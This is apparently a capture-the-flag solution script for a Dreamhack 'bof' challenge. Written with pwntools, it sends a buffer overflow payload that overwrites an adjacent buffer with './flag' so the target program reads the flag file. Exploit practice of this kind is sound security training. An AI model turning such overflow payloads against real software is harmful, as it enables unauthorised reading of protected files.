#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'bof'
HOST = 'host3.dreamhack.games'
PORT = 10946

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *main
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
payload = b'A' * 0x80 + b'./flag'
payload = payload.ljust(0x90, b'\x00')
p.sendafter(b'meow? ', payload)
p.interactive()
